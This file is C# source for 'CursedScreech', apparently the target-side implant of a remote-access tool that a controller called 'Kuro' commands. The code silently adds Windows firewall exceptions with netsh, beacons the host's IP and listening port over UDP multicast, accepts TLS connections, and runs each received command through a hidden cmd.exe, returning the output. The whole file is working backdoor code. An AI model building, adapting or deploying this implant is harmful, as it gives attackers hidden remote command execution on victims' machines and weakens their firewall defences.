using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CursedScreech
{
    public class CursedScreech
    {
        // ==================================================
        //                 CLASS ATTRIBUTES
        // ==================================================
        private string msg = "";
        private int lport = 0;
        private static string certSerial = "";
        private static string certHash = "";
        private string command = "";
        private readonly string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        private readonly string exeName = Path.GetFileNameWithoutExtension(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);

        // ==================================================
        //            CURSED SCREECH INITIALIZER
        // ==================================================
	    public CursedScreech() {

            // Get the current path and name of the executable to set up rules for it in the firewall
            string addTCPRule = "netsh advfirewall firewall add rule name=\"" + exeName + "\" program=\"" + exePath + "\" protocol=TCP dir=in localport=xxxxx action=allow";
            string delFirewallRule = "netsh advfirewall firewall delete rule name=\"" + exeName + "\"";

            // Generate a random port on which to listen for commands from Kuro
            Random rnd = new Random();
            lport = rnd.Next(10000, 65534);

            // Delete old firewall rules
            exec(delFirewallRule);

            // Add new firewall rule
            exec(addTCPRule.Replace("xxxxx", lport.ToString()));
        }

        // ===========================================================
        //   OPTIONAL METHODS TO SET EXPECTED CERTIFICATE PROPERTIES
        // ===========================================================
        public void setRemoteCertificateHash(string hash) {
            certHash = hash;
        }

        public void setRemoteCertificateSerial(string serial) {
            certSerial = serial;
        }

        // ==================================================
        //        METHOD TO START THE MULTICAST THREAD
        // ==================================================
        public void startMulticaster(string address, int port, int heartbeatInterval = 5) {
            string addUDPRule = "netsh advfirewall firewall add rule name=\"" + exeName + "\" program=\"" + exePath + "\" protocol=UDP dir=out localport=" + port + " action=allow";
            exec(addUDPRule);
            new Thread(() => {
                
                UdpClient udpclient = new UdpClient(port);
                IPAddress mcastAddr = IPAddress.Parse(address);
                udpclient.JoinMulticastGroup(mcastAddr);
                IPEndPoint kuro = new IPEndPoint(mcastAddr, port);
                
                while (true) {
                    Byte[] buffer = null;
                    string localIP = localAddress();
                    if (localIP.Length == 0) {
                        localIP = "0.0.0.0";
                    }

                    // If a message is available to be sent then do so
                    if (msg.Length > 0) {
                        msg = "msg:" + msg;

                        buffer = Encoding.ASCII.GetBytes(msg);
                        udpclient.Send(buffer, buffer.Length, kuro);
                        msg = "";
                    }

                    // Send the listening socket information to Kuro
                    buffer = Encoding.ASCII.GetBytes(localIP + ":" + lport.ToString());
                    udpclient.Send(buffer, buffer.Length, kuro);

                    // Sleep for however long the heartbeat interval is set
                    Thread.Sleep(heartbeatInterval * 1000);
                }
            }).Start();
        }

        // ====================================================
        //  MULTITHREADED SECURE LISTENER WITH SHELL EXECUTION
        // ====================================================
        public void startSecureServerThread(string key, string keyPassword) {
            new Thread(() => startSecureServer(key, keyPassword)).Start();
	    }

        // ====================================================
        //               BLOCKING SECURE SERVER
        // ====================================================
        public void startSecureServer(string key, string keyPassword) {

            // Create a socket for the listener
            IPAddress ipAddress = IPAddress.Parse("0.0.0.0");
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, lport);
            TcpListener listener = new TcpListener(localEndPoint);

            // Read the certificate information from file.  This should be a .pfx container
            // with a private and public key so we can be verified by Kuro
            X509Certificate2 csKey = loadKeys(key, keyPassword);

            // Tell the thread to operate in the background
            Thread.CurrentThread.IsBackground = true;

            bool connected = false;
            TcpClient client = new TcpClient();
            Int32 bytesRecvd = 0;
            string[] seps = new string[] { " " };
            try {

                // Start listening
                listener.Start();

                while (true) {
                    // Begin listening for connections
                    client = listener.AcceptTcpClient();

                    try {
                        var sslStream = new SslStream(client.GetStream(), false, atkCertValidation);
                        sslStream.AuthenticateAsServer(csKey, true, (SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls), false);

                        connected = true;
                        while (connected) {
                            byte[] cmdRecvd = new Byte[4096];

                            bytesRecvd = sslStream.Read(cmdRecvd, 0, cmdRecvd.Length);

                            if (bytesRecvd < 1) {
                                connected = false;
                                client.Close();
                                break;
                            }

                            // Append the decrytped message to the command string
                            command = Encoding.ASCII.GetString(cmdRecvd, 0, bytesRecvd);

                            Thread shellThread = new Thread(() => sendMsg(sslStream));
                            shellThread.Start();
                        }
                    }
                    catch (Exception) {
                        connected = false;
                        client.Close();
                        break;
                    }
                }
            }
            catch (Exception) { }
        }

        // ==================================================
        //            METHOD TO SEND DATA TO KURO
        // ==================================================
        private void sendMsg(SslStream cStream) {
            string msg = command;
            command = "";
            string ret = exec(msg);
            if (ret.Length > 0) {
                byte[] retMsg = Encoding.ASCII.GetBytes(ret);
                cStream.Write(retMsg, 0, retMsg.Length);
            }
        }

        // ==================================================
        //         METHOD TO GET THE LOCAL IP ADDRESS
        // ==================================================
        private string localAddress() {
            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList) {
                if (ip.AddressFamily == AddressFamily.InterNetwork) {
                    return ip.ToString();
                }
            }
            return "";
        }

        // ==================================================
        //         METHOD TO EXECUTE A SHELL COMMAND
        // ==================================================
        private static string exec(string args) {
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + args;
            proc.StartInfo = startInfo;
            proc.Start();
            proc.WaitForExit(2000);
            return proc.StandardOutput.ReadToEnd();
        }

        // ==================================================
        //           METHOD TO LOAD KEYS FROM A PFX
        // ==================================================
        private X509Certificate2 loadKeys(string key, string password) {
            var certStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(key);
            byte[] bytes = new byte[certStream.Length];
            certStream.Read(bytes, 0, bytes.Length);
            return new X509Certificate2(bytes, password);
        }

        // ==================================================
        //        METHOD TO VERIFY KURO'S CERTIFICATE
        // ==================================================
        private static bool atkCertValidation(Object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
            if (certSerial != "") {
                if (BitConverter.ToString(cert.GetSerialNumber()) != certSerial) { return false; }
            }
            if (certHash != "") {
                if (cert.GetCertHashString() != certHash) { return false; }
            }
            if (sslPolicyErrors == SslPolicyErrors.None) { return true; }
            if (sslPolicyErrors == SslPolicyErrors.RemoteCertificateChainErrors) { return true; }
            return false;
        }
    }
}
